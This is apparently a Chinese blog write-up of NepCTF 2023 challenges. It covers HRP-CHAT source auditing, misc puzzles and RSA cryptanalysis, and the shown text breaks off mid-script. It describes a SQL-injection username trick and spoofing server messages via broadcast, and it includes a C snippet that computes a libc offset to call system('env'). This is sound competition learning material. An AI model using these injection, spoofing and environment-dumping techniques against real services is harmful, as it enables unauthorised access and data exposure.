title=\"HRP-CHAT\"></a>HRP-CHAT</h2><p>这一套题都是源码审计的题目，漏洞也很简单</p>\n<h3 id=\"1\"><a href=\"#1\" class=\"headerlink\" title=\"1\"></a>1</h3><p>SQL注入，注意这里不能用万能密码1’ or 1&#x3D;1–因为在client中scanf不支持空格，所以就要先在数据库中注册一个用户名为1的用户，然后再次注册一个用户名为<code>1&#39;--</code></p>\n<p><img src=\"/p/2023NepCTF/image-20230814094413198.png\" alt=\"image-20230814094413198\"></p>\n<h3 id=\"2\"><a href=\"#2\" class=\"headerlink\" title=\"2\"></a>2</h3><p>首先分析源码（其实也不用chat的sever，只要看client的处理逻辑即可）可以看到这里Bot模式只会返回一个字符串<code>&#39;远程AI协助服务正在开发中!&#39;</code>，但是我们需要服务器返回<code>RemoteVIPApplicationCertificationHasPassed</code>这一串才能获得flag，那么我们就需要伪造服务器返回的message。我们可以看Chat模式下的服务器的原理，服务器就是转发消息进行广播。那么我们就可以想到</p>\n<p><img src=\"/p/2023NepCTF/image-20230814094950217.png\" alt=\"image-20230814094950217\"></p>\n<p>如果让一台机器在Bot模式下，另一台机器在Chat模式下</p>\n<p><img src=\"/p/2023NepCTF/image-20230814095426656.png\" alt=\"image-20230814095426656\"></p>\n<p>那么我们就可以利用广播的机制，伪造服务器返回message，这里也没有做任何校验，所以就能得到flag</p>\n<p><img src=\"/p/2023NepCTF/b9d03732b675ba6d6a492b90d01f9db.png\" alt=\"b9d03732b675ba6d6a492b90d01f9db\"></p>\n<h3 id=\"3\"><a href=\"#3\" class=\"headerlink\" title=\"3\"></a>3</h3><p>3号题目我看不太出来有啥漏洞，感觉就是正常的逻辑，抽卡获取角色，用message查看当前角色池子和技能，抽到H3h3QAQ就可以了，释放第二个技能log4j，就能打死ThTsOd了</p>\n<p><img src=\"/p/2023NepCTF/6a5cba2c75f12515107d0ae7af099ac.png\" alt=\"6a5cba2c75f12515107d0ae7af099ac\"></p>\n<h3 id=\"4\"><a href=\"#4\" class=\"headerlink\" title=\"4\"></a>4</h3><p>这个比较玄学，在我打2号flag的时候，可能是2号flag需要卡一个时机，我就写了脚本爆破，可能请求太多了，服务器就崩溃了，进入Safe box的cmd界面，输入Safe_Mode_Key就可以获得flag</p>\n<h1 id=\"Misc\"><a href=\"#Misc\" class=\"headerlink\" title=\"Misc\"></a>Misc</h1><h2 id=\"codes\"><a href=\"#codes\" class=\"headerlink\" title=\"codes\"></a>codes</h2><p>pwn的思路打，先泄露libc，找到偏移直接system(“env”)一把梭</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;1234&quot;</span>);</span><br><span class=\"line\">  <span class=\"type\">size_t</span> tmp = &amp;<span class=\"built_in\">printf</span>;</span><br><span class=\"line\">tmp -= <span class=\"number\">0x61c90</span>;</span><br><span class=\"line\">tmp += <span class=\"number\">0x52290</span>;</span><br><span class=\"line\">((<span class=\"type\">int</span> (*)(<span class=\"type\">const</span> <span class=\"type\">char</span> *, ...))tmp)(<span class=\"string\">&quot;en&quot;</span> <span class=\"string\">&quot;v&quot;</span>);</span><br><span class=\"line\"> &#125; </span><br></pre></td></tr></table></figure>\n\n<h2 id=\"与AI共舞的哈夫曼\"><a href=\"#与AI共舞的哈夫曼\" class=\"headerlink\" title=\"与AI共舞的哈夫曼\"></a>与AI共舞的哈夫曼</h2><p>确实不用自己写代码，GPT一把梭</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">decompress</span>(<span class=\"params\">input_file, output_file</span>):</span><br><span class=\"line\">    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(input_file, <span class=\"string\">&#x27;rb&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">        <span class=\"comment\"># Read frequency information</span></span><br><span class=\"line\">        num_freq = <span class=\"built_in\">ord</span>(f.read(<span class=\"number\">1</span>))</span><br><span class=\"line\">        frequencies = &#123;&#125;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(num_freq):</span><br><span class=\"line\">            byte, freq = f.read(<span class=\"number\">1</span>)[<span class=\"number\">0</span>], <span class=\"number\">0</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">4</span>):</span><br><span class=\"line\">                freq = (freq &lt;&lt; <span class=\"number\">8</span>) | f.read(<span class=\"number\">1</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">            frequencies[byte] = freq</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># Rebuild Huffman tree</span></span><br><span class=\"line\">        root = build_huffman_tree(frequencies)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># Decode compressed data</span></span><br><span class=\"line\">        <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(output_file, <span class=\"string\">&#x27;wb&#x27;</span>) <span class=\"keyword\">as</span> out_f:</span><br><span class=\"line\">            node = root</span><br><span class=\"line\">            <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">                bit = f.read(<span class=\"number\">1</span>)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> bit:</span><br><span class=\"line\">                    <span class=\"keyword\">break</span></span><br><span class=\"line\">                bit = <span class=\"built_in\">int</span>.from_bytes(bit, byteorder=<span class=\"string\">&#x27;big&#x27;</span>)</span><br><span class=\"line\">                <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>, -<span class=\"number\">1</span>, -<span class=\"number\">1</span>):</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (bit &gt;&gt; i) &amp; <span class=\"number\">1</span>:</span><br><span class=\"line\">                        node = node.right</span><br><span class=\"line\">                    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                        node = node.left</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> node.char <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">                        out_f.write(<span class=\"built_in\">bytes</span>([node.char]))</span><br><span class=\"line\">                        node = root</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ConnectedFive\"><a href=\"#ConnectedFive\" class=\"headerlink\" title=\"ConnectedFive\"></a>ConnectedFive</h2><p>万宁五子棋，注意下棋到同一个位置会死机所以要，写逻辑爆破，为了提高胜率，这里采用最朴素的策略，计算每一个空白位置自己的棋子的密度，来判断哪些位置更优</p>\n<p>exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">context.timeout = <span class=\"number\">3</span></span><br><span class=\"line\">getIO = <span class=\"keyword\">lambda</span>: remote(<span class=\"string\">&quot;nepctf.1cepeak.cn&quot;</span>, <span class=\"number\">30582</span>)</span><br><span class=\"line\">io = getIO()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">getinfo</span>():</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">b&quot;MESSAGE computer: &quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">b&quot;\\n&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">b&quot;\\n&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">b&quot;\\n&quot;</span>)</span><br><span class=\"line\">    scoreboard = io.recvuntil(<span class=\"string\">b&quot;\\n&quot;</span>, drop=<span class=\"literal\">True</span>).decode()</span><br><span class=\"line\">    <span class=\"comment\"># print(f&quot;[+] Scoreboard &#123;scoreboard&#125;&quot;)</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># io.recvuntil(b&quot;\\t   a b c d e f g h i j k l m n o\\n&quot;)</span></span><br><span class=\"line\">    checkerboard = []</span><br><span class=\"line\">    raw = io.recvuntil(<span class=\"string\">b&quot;\\t   a b c d e f g h i j k l m n o\\n&quot;</span>).decode()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">15</span>):</span><br><span class=\"line\">        <span class=\"comment\"># io.recvuntil(b&quot;\\t&quot; + bytearray([i+ord(&#x27;a&#x27;)]))</span></span><br><span class=\"line\">        r = io.recvuntil(<span class=\"string\">b&quot;\\n&quot;</span>).decode()</span><br><span class=\"line\">        raw += r</span><br><span class=\"line\">        a = r.strip()</span><br><span class=\"line\">        checkerboard.append(a[<span class=\"number\">3</span>::<span class=\"number\">2</span>])</span><br><span class=\"line\">    <span class=\"comment\"># print(checkerboard)</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> scoreboard, checkerboard, raw</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">key = <span class=\"string\">&quot;abcdefghijklmno&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">check_pos</span>(<span class=\"params\">x, y, checkerboard: []</span>):</span><br><span class=\"line\">    res = <span class=\"number\">0</span></span><br><span class=\"line\">    cnt = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">max</span>(<span class=\"number\">0</span>, x-<span class=\"number\">4</span>), <span class=\"built_in\">min</span>(<span class=\"number\">14</span>, x+<span class=\"number\">4</span>)+<span class=\"number\">1</span>):</span><br><span class=\"line\">        cnt += checkerboard[i][y] == <span class=\"string\">&#x27;X&#x27;</span></span><br><span class=\"line\">    res = <span class=\"built_in\">max</span>(res, cnt)</span><br><span class=\"line\"></span><br><span class=\"line\">    cnt = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">max</span>(<span class=\"number\">0</span>, y - <span class=\"number\">4</span>), <span class=\"built_in\">min</span>(<span class=\"number\">14</span>, y + <span class=\"number\">4</span>)+<span class=\"number\">1</span>):</span><br><span class=\"line\">        cnt += checkerboard[x][i] == <span class=\"string\">&#x27;X&#x27;</span></span><br><span class=\"line\">    res = <span class=\"built_in\">max</span>(res, cnt)</span><br><span class=\"line\"></span><br><span class=\"line\">    cnt = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(-<span class=\"number\">4</span>, <span class=\"number\">4</span>+<span class=\"number\">1</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"number\">0</span> &lt;= x + i &lt;= <span class=\"number\">14</span> <span class=\"keyword\">and</span> <span class=\"number\">0</span> &lt;= y + i &lt;= <span class=\"number\">14</span>:</span><br><span class=\"line\">            cnt += checkerboard[x+i][y+i] == <span class=\"string\">&#x27;X&#x27;</span></span><br><span class=\"line\">    res = <span class=\"built_in\">max</span>(res, cnt)</span><br><span class=\"line\"></span><br><span class=\"line\">    cnt = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(-<span class=\"number\">4</span>, <span class=\"number\">4</span>+<span class=\"number\">1</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"number\">0</span> &lt;= x - i &lt;= <span class=\"number\">14</span> <span class=\"keyword\">and</span> <span class=\"number\">0</span> &lt;= y + i &lt;= <span class=\"number\">14</span>:</span><br><span class=\"line\">            cnt += checkerboard[x-i][y+i] == <span class=\"string\">&#x27;X&#x27;</span></span><br><span class=\"line\">    res = <span class=\"built_in\">max</span>(res, cnt)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> res</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_nice_pos</span>(<span class=\"params\">checkerboard</span>):</span><br><span class=\"line\">    p = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">15</span>):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">15</span>):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> checkerboard[i][j] <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> <span class=\"string\">&quot;.+&quot;</span>:</span><br><span class=\"line\">                <span class=\"keyword\">continue</span></span><br><span class=\"line\">            p.append((check_pos(i, j, checkerboard), i, j))</span><br><span class=\"line\">    p.sort(reverse=<span class=\"literal\">True</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> p[<span class=\"number\">0</span>][<span class=\"number\">1</span>:]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">action</span>(<span class=\"params\">checkerboard: []</span>):</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"built_in\">len</span>(checkerboard), end=<span class=\"string\">&quot; &quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> checkerboard:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"built_in\">len</span>(x), end=<span class=\"string\">&quot; &quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>()</span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        <span class=\"comment\"># x = random.randint(0, 14)</span></span><br><span class=\"line\">        <span class=\"comment\"># y = random.randint(0, 14)</span></span><br><span class=\"line\">        <span class=\"comment\"># print(x, y)</span></span><br><span class=\"line\">        x, y = get_nice_pos(checkerboard)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> checkerboard[x][y] <span class=\"keyword\">in</span> [<span class=\"string\">&#x27;.&#x27;</span>, <span class=\"string\">&#x27;+&#x27;</span>]:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> key[y] + key[x]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">100</span>):</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        s, c, r = getinfo()</span><br><span class=\"line\">        log.success(<span class=\"string\">f&quot;Scoreboard <span class=\"subst\">&#123;s&#125;</span>&quot;</span>)</span><br><span class=\"line\">        log.success(<span class=\"string\">f&quot;Checkerboard \\n<span class=\"subst\">&#123;r&#125;</span>&quot;</span>)</span><br><span class=\"line\">        ans = action(c)</span><br><span class=\"line\">        io.sendline(ans.encode())</span><br><span class=\"line\">    <span class=\"keyword\">except</span> EOFError:</span><br><span class=\"line\">        io.close()</span><br><span class=\"line\">        io = getIO()</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"CheckIn\"><a href=\"#CheckIn\" class=\"headerlink\" title=\"CheckIn\"></a>CheckIn</h2><p>b站发不出去，等了一会儿，flag直接在题目描述了</p>\n<p><img src=\"/p/2023NepCTF/image-20230814100358316.png\" alt=\"image-20230814100358316\"></p>\n<h2 id=\"陌生的语言\"><a href=\"#陌生的语言\" class=\"headerlink\" title=\"陌生的语言\"></a>陌生的语言</h2><p><img src=\"/p/2023NepCTF/7612dfe97ed54dfe36942465eba34b7.jpg\" alt=\"7612dfe97ed54dfe36942465eba34b7\"></p>\n<p><a href=\"https://ay.medyotan.ga/upload/lwa_moonrunes.png\">https://ay.medyotan.ga/upload/lwa_moonrunes.png</a></p>\n<p><img src=\"/p/2023NepCTF/image-20230814104059226.png\" alt=\"image-20230814104059226\"></p>\n<p>直接出</p>\n<p>NEPNEP_A_BELIEVING_HEART_IS_YOUR_MAGIC</p>\n<h2 id=\"小叮弹钢琴\"><a href=\"#小叮弹钢琴\" class=\"headerlink\" title=\"小叮弹钢琴\"></a>小叮弹钢琴</h2><p>莫斯编码得到<code>YOUSHOULDUSETHISTOXORSOMETHING</code>，字面意思，你需要用这个xor，还有一段直接mid看</p>\n<p><img src=\"/p/2023NepCTF/image-20230814101009564.png\" alt=\"image-20230814101009564\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">x = <span class=\"number\">0x370a05303c290e045005031c2b1858473a5f052117032c39230f005d1e17</span></span><br><span class=\"line\">xx = x.to_bytes(x.bit_length() // <span class=\"number\">8</span> + <span class=\"number\">1</span>, <span class=\"string\">&quot;big&quot;</span>)</span><br><span class=\"line\">key = <span class=\"string\">b&quot;YOUSHOULDUSETHISTOXORSOMETHING&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(xx)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">len</span>(key), <span class=\"built_in\">len</span>(xx))</span><br><span class=\"line\"><span class=\"built_in\">print</span>((<span class=\"built_in\">bytearray</span>(<span class=\"built_in\">map</span>(<span class=\"keyword\">lambda</span> x: x[<span class=\"number\">0</span>] ^ x[<span class=\"number\">1</span>] ^ <span class=\"number\">32</span>, <span class=\"built_in\">zip</span>(xx, key)))))</span><br></pre></td></tr></table></figure>\n\n<p>大小写转换异或32</p>\n<h2 id=\"你也喜欢三月七么\"><a href=\"#你也喜欢三月七么\" class=\"headerlink\" title=\"你也喜欢三月七么\"></a>你也喜欢三月七么</h2><p>首先是用群名字sha256得到<code>dd8e671df3882c5be6423cd030bd7cb69671ef27dfe7a541903edc4e23168009</code>取前面的16个字节</p>\n<p><img src=\"/p/2023NepCTF/image-20230814101534500.png\" alt=\"image-20230814101534500\"></p>\n<p>得到<a href=\"https://img1.imgtp.com/2023/07/24/yOkXWSJT.png\">https://img1.imgtp.com/2023/07/24/yOkXWSJT.png</a></p>\n<p><img src=\"/p/2023NepCTF/image-20230814101546437.png\" alt=\"image-20230814101546437\"></p>\n<p>一眼星穹铁道的文字</p>\n<p><img src=\"/p/2023NepCTF/efa6d5119c9f4eef31c7cdfea8d5312.png\" alt=\"efa6d5119c9f4eef31c7cdfea8d5312\"></p>\n<p>翻译可得</p>\n<p>HRP_aIways_likes_March_7th这里的aIways的I是大写的i</p>\n<h2 id=\"lic\"><a href=\"#lic\" class=\"headerlink\" title=\"lic\"></a>lic</h2><p>磁带信息，先用audiotap转磁带文件，再用010打开</p>\n<p><img src=\"/p/2023NepCTF/image-20230814101909845.png\" alt=\"image-20230814101909845\"></p>\n<p>可以看到文字的NepCTF形状，利用脚本反转之后可以看到</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&quot;attachment.tap&quot;</span>, <span class=\"string\">&quot;rb&quot;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">    data = f.read()[<span class=\"number\">50</span>:].strip(<span class=\"string\">b&quot;\\xa0&quot;</span>)</span><br><span class=\"line\">data = <span class=\"string\">b&quot;aaa&quot;</span> + data</span><br><span class=\"line\">chunk = <span class=\"number\">16</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, <span class=\"built_in\">len</span>(data), chunk):</span><br><span class=\"line\">    <span class=\"comment\"># print()</span></span><br><span class=\"line\">    x = data[i:i+chunk][::-<span class=\"number\">1</span>].decode(errors=<span class=\"string\">&quot;ignore&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;&quot;</span>.join(<span class=\"built_in\">map</span>(<span class=\"keyword\">lambda</span> _: <span class=\"string\">&quot;  &quot;</span> <span class=\"keyword\">if</span> _ == <span class=\"string\">&#x27;&gt;&#x27;</span> <span class=\"keyword\">else</span> _ + <span class=\"string\">&#x27; &#x27;</span>, x)))</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Crypto\"><a href=\"#Crypto\" class=\"headerlink\" title=\"Crypto\"></a>Crypto</h1><h2 id=\"random-RSA\"><a href=\"#random-RSA\" class=\"headerlink\" title=\"random_RSA\"></a>random_RSA</h2><p>winner’s攻击，这里用了低指数解密算法的脚本<a href=\"https://github.com/pablocelayes/rsa-wiener-attack%EF%BC%8C%E6%81%A2%E5%A4%8Dd\">https://github.com/pablocelayes/rsa-wiener-attack，恢复d</a></p>\n<p>因为phi(n^2)近似(q^2-1)(p^2-1)，先用命令交互出一组数据，之后使用下面脚本爆破</p>\n<p>得到d之后</p>\n<p>因为$ed-1&#x3D;k(p^2-1)(q^2-1)&#x3D;k(p^2q^2-p^2-q^2+1)&#x3D;k(n^2-p^2-q^2+1)$</p>\n<p>所以可以利用$(ed-1+n^2)&#x2F;n$得到k</p>\n<p>之后一把梭求p，q即可</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> ContinuedFractions, Arithmetic, RSAvulnerableKeyGenerator</span><br><span class=\"line\"><span class=\"keyword\">from</span> gmpy2 <span class=\"keyword\">import</span> gcd, iroot</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">hack_RSA</span>(<span class=\"params\">e, n</span>):</span><br><span class=\"line\">    <span 